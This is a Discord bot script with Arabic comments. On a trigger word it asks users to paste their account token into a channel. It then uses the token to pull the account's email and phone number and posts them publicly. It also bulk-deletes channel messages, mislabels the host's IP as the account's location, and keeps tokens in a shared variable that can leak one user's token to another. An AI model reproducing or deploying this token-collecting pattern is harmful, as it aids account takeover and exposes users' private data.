const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const axios = require('axios');

// ضع توكن البوت هنا أو استخدم متغير البيئة
const BOT_TOKEN = process.env.BOT_TOKEN || 'ضع_توكن_البوت_هنا'; 

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.DirectMessages
    ]
});

// معرف القناة التي سيتم فيها التفاعل
const TARGET_CHANNEL_ID = '1575683930466558053'; 

// متغيرات لتخزين الحالة الحالية
let userToken = null;
let pendingUser = null;

// دالة لجلب IP العام
async function getPublicIP() {
    try {
        const response = await axios.get('https://api.ipify.org?format=json');
        return response.data.ip;
    } catch (error) {
        return 'غير متاح';
    }
}

// دالة لجلب بيانات الحساب الشخصي (Email, Phone) باستخدام Axios
async function getUserProfileData(token) {
    try {
        const response = await axios.get('https://discord.com/api/users/@me', {
            headers: {
                Authorization: `Bearer ${token}`
            }
        });
        return response.data;
    } catch (error) {
        console.error('خطأ في جلب بيانات المستخدم:', error.response?.data || error.message);
        return null;
    }
}

client.once('ready', () => {
    console.log(`✅ تم تسجيل الدخول باسم: ${client.user.tag}`);
    
    // تغيير الحالة إلى Streaming فوراً عند التشغيل
    client.user.setActivity('Streaming', {
        type: 'STREAMING',
        url: 'https://www.twitch.tv/your_channel' // غير الرابط إلى رابط البث الخاص بك
    });
});

// الاستماع للرسائل في الروم
client.on('messageCreate', async (message) => {
    // تجاهل رسائل البوت نفسه
    if (message.author.bot) return;
    
    // التحقق من أن الرسالة في القناة المحددة
    if (message.channel.id !== TARGET_CHANNEL_ID) return;

    // التحقق من أن الرسالة هي "Pea" فقط (حساسية الحروف)
    if (message.content.trim() === 'Pea') {
        
        // إذا كان هناك مستخدم آخر ينتظر توكنه، نرفض الطلب الحالي
        if (pendingUser) {
            await message.reply('⚠️ يوجد مستخدم آخر ينتظر إرسال التوكن حالياً.');
            return;
        }

        // نرد على المستخدم بطلب التوكن
        await message.reply('🔑 أرسل لي توكن حسابك (Account Token) لبدء العملية.');
        
        // نحدد أن هذا المستخدم هو الذي سيقوم بإرسال التوكن
        pendingUser = message.author;
        
        // نخزن معرف المستخدم لحفظ التوكن له لاحقاً
        const userId = message.author.id;
        
        // ننتظر الرد القادم من هذا المستخدم فقط
        const filter = m => m.author.id === userId && m.channel.id === TARGET_CHANNEL_ID;
        
        let collector;
        
        try {
            collector = message.channel.createMessageCollector({ 
                filter, 
                time: 60000 // مدة الانتظار 60 ثانية
            });

            collector.on('collect', async (m) => {
                // تخزين التوكن
                userToken = m.content.trim();
                
                // إيقاف المجمّع
                collector.stop();
                
                // نعلم المستخدم أننا نستلم التوكن
                await m.reply('⏳ جاري معالجة التوكن وجلب المعلومات...');
                
                // نقوم بالعملية المطلوبة
                await processBotActions(m.author, userToken);
                
                // إعادة تعيين المتغيرات
                pendingUser = null;
                userToken = null;
            });

            collector.on('end', () => {
                if (!userToken) {
                    // إذا انتهى الوقت بدون إرسال توكن
                    pendingUser = null;
                }
            });

        } catch (error) {
            console.error(error);
        }
    }
});

// دالة تنفيذ العمليات بعد استلام التوكن
async function processBotActions(user, token) {
    try {
        // 1. جلب بيانات الحساب الشخصي باستخدام التوكن المرسل
        const userProfile = await getUserProfileData(token);
        
        // استخراج البيانات
        const email = userProfile?.email || 'غير معروف';
        const phone = userProfile?.phone || 'غير مربط';
        const username = userProfile?.username || 'غير معروف';
        const avatarURL = userProfile?.avatar ? `https://cdn.discordapp.com/avatars/${userProfile.id}/${userProfile.avatar}.png` : 'لا يوجد أفاتار';

        // 2. حذف الرسائل القديمة في القناة (آخر 100 رسالة)
        const channel = client.channels.cache.get(TARGET_CHANNEL_ID);
        if (channel) {
            try {
                const messages = await channel.messages.fetch({ limit: 100 });
                if (messages.size > 0) {
                    await channel.bulkDelete(messages, true);
                }
            } catch (err) {
                console.error('خطأ في حذف الرسائل:', err);
            }
        }

        // 3. جمع معلومات الحساب (من بيانات البوت الحالي + البيانات المسترجعة)
        const botInfo = `
**📊 معلومات الحساب:**
👤 **الاسم:** ${username}
🆔 **ID:** ${userProfile?.id || 'غير معروف'}
📧 **الإيميل المربوط:** ${email}
📱 **الرقم المربوط:** ${phone}
🌐 **الموقع (IP):** ${await getPublicIP()}
🖼️ **الأفاتار:** [رابط الأفاتار](${avatarURL})

اضغط على الزر أدناه لنسخ التوكن.
`;

        // 4. إنشاء الزر
        const copyButton = new ButtonBuilder()
            .setLabel('نسخ التوكن')
            .setStyle(ButtonStyle.Primary)
            .setCustomId('copy_token_button');

        const row = new ActionRowBuilder().addComponents(copyButton);

        // 5. إرسال الرسالة مع الزر
        await channel.send({
            content: botInfo,
            components: [row]
        });

        // 6. إرسال التوكن في الخاص للمستخدم الذي أرسله
        await user.send({
            content: `**🔑 توكن حسابك الذي أرسلته:**\n\`\`\`${token}\`\`\``
        });

        await user.send({
            content: '✅ تم إرسال التوكن إليك في الخاص.'
        });

    } catch (error) {
        console.error('خطأ في المعالجة:', error);
        await user.send('❌ حدث خطأ أثناء معالجة التوكن. تأكد من صحة التوكن.');
    }
}

// الاستماع لضغط الزر
client.on('interactionCreate', async (interaction) => {
    if (!interaction.isButton()) return;

    if (interaction.customId === 'copy_token_button') {
        // نستخدم التوكن المخزن مسبقاً
        if (userToken) {
            await interaction.user.send({
                content: `**🔑 توكن حسابك:**\n\`\`\`${userToken}\`\`\``
            });
            
            await interaction.reply({
                content: '✅ تم إرسال التوكن إليك في الخاص.',
                ephemeral: true
            });
        } else {
            await interaction.reply({
                content: '⚠️ لا يوجد توكن متاح حالياً.',
                ephemeral: true
            });
        }
    }
});

client.login(BOT_TOKEN);